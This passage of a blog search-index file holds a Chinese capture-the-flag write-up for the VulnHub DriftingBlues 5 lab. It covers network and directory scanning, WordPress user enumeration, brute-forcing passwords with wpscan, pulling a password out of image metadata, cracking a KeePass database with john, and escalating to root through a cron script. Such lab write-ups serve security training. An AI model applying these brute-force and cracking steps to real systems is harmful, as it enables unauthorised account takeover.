+    <content><![CDATA[<h1 id="VulnHub-DRIFTINGBLUES-5"><a href="#VulnHub-DRIFTINGBLUES-5" class="headerlink" title="VulnHub-DRIFTINGBLUES: 5"></a>VulnHub-DRIFTINGBLUES: 5</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.217.129/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409102602498.png" alt="image-20240409102602498"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.217.147</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409102707017.png" alt="image-20240409102707017"></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u 192.168.217.147 -e * -x 403 --random-agent</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409104552041.png" alt="image-20240409104552041"></p>
+<h3 id="查看80-端口"><a href="#查看80-端口" class="headerlink" title="查看80 端口"></a>查看80 端口</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409104704685.png" alt="image-20240409104704685"></p>
+<p>发现是wordpress ,登录界面根据刚才扫描的目录和常识得知是 &#x2F;wp-admin</p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409124901585.png" alt="image-20240409124901585"></p>
+<p>使用wpscan 扫一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.217.147 -e u</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409125353940.png" alt="image-20240409125353940"></p>
+<p>发现了五个用户名</p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409125713683.png" alt="image-20240409125713683"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abuzerkomurcu</span><br><span class="line">gadd</span><br><span class="line">gill</span><br><span class="line">colling</span><br><span class="line">satanic</span><br></pre></td></tr></table></figure>
+
+<p>写到 user.txt中。现在只有用户名没有密码，使用cewl爬取一个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl -m 6 -w pass.txt http://192.168.217.147</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240409130547044.png" alt="image-20240409130547044"></p>
+<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>开始爆破，使用工具wpscan</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.217.147 -U user.txt -P pass.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240409131845107.png" alt="image-20240409131845107"></p>
+<p>得到一组用户名密码：<strong>Username: gill, Password: interchangeable</strong></p>
+<p>登录wordpress<img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409161251926.png" alt="image-20240409161251926"></p>
+<p>尝试写入反弹shell，结果失败。看看还有没有其他线索</p>
+<p>发现几张图片，有没在前面见过的，那就看看有没有隐写</p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409161453068.png" alt="image-20240409161453068"></p>
+<p>经过查看发现倒数第二张图片有提示：</p>
+<p>经过：<img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409161708439.png" alt="image-20240409161708439"></p>
+<p>把文件下载下来：<code>wget http://192.168.217.147/wp-content/uploads/2021/02/dblogo.png </code></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409161952513.png" alt="image-20240409161952513"></p>
+<p>使用工具<code>exiftool</code>进行解析</p>
+<p><code>exiftool /home/kali/blues-5/dblogo.png</code></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409162313590.png" alt="image-20240409162313590"></p>
+<p>最后发现了隐藏得 <code>ssh</code>密码：<code>59583hello</code>用户名的话就用之前的那五个用户名试试</p>
+<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p><code>ssh gill@192.168.217.147</code></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409163009591.png" alt="image-20240409163009591"></p>
+<p>获得第一个flag</p>
+<p>还发现一个以<code>kdbx</code>为后缀的文件通过百度发现</p>
+<p>KeePass是一个免费的开源密码管理器，它可以帮助您管理 以安全的方式使用您的密码。您可以将所有密码存储在一个密码中 数据库，该数据库使用主密钥锁定。所以你只需要记住一个 单个主密钥来解锁整个数据库。数据库文件已加密 使用目前已知的最佳和最安全的加密算法 （AES-256、ChaCha20 和 Twofish）。 有关详细信息，请参阅<a href="https://keepass.info/features.html">功能</a>页面。</p>
+<h3 id="kdbx文件密码爆破"><a href="#kdbx文件密码爆破" class="headerlink" title="kdbx文件密码爆破"></a>kdbx文件密码爆破</h3><p>将文件传到kali<code>scp -rp gill@192.168.217.147:/home/gill/keyfile.kdbx /home/kali/blues-5</code></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409171753558.png" alt="image-20240409171753558"></p>
+<p>利用keepass2john工具获取其哈希值方便我们进行爆破<code>keepass2john keyfile.kdbx &gt; hash</code></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409172138750.png" alt="image-20240409172138750"></p>
+<p>尝试使用john爆破：<code>john --wordlist=/usr/share/wordlists/rockyou.txt hash</code></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240409172554352.png" alt="image-20240409172554352"></p>
+<p>利用获得密码信息使用keepass读取keyfile.kdbx文件，但是里面密码是*号显示并且只显示了标题，用户名显示为空。</p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/2834847-20230410105057333-1464213532.png" alt="img"></p>
+<h3 id="定时任务发现"><a href="#定时任务发现" class="headerlink" title="定时任务发现"></a>定时任务发现</h3><p>直接上脚本：linpeas.sh，在本机开启web服务，然后使用wget下载该文件至&#x2F;tmp目录并执行该文件，发现一个比较特殊的文件：&#x2F;keyfolder，但是查看该文件内信息，显示是一个空的目录。</p>
+<p>赋予pspy64执行权限，然后执行该文件，发现会定时执行&#x2F;root&#x2F;key.sh文件，根据名字猜测是和密码有关。</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>后来想着是不是这个脚本将密码写入到了刚才keepass发现的几个标题中去了，然后就尝试在&#x2F;keyfolder目录下创建刚才的几个标题，但是没什么变化，后来就一个一个单独创建，在创建fracturedocean文件时，多出来一个rootcreds.txt文件，读取该文件获得root密码信息：imjustdrifting31。</p>
+<p>使用获得密码信息切换到root账户，然后在&#x2F;root目录下发现root.txt文件，读取该文件成功获得flag值。</p>
+]]></content>
+      <categories>
+        <category>靶场，DRIFTINGBLUES系列，渗透笔记</category>
+      </categories>
+      <tags>
+        <tag>靶场，DRIFTINGBLUES系列，渗透笔记</tag>
       </tags>
   </entry>
 </search>
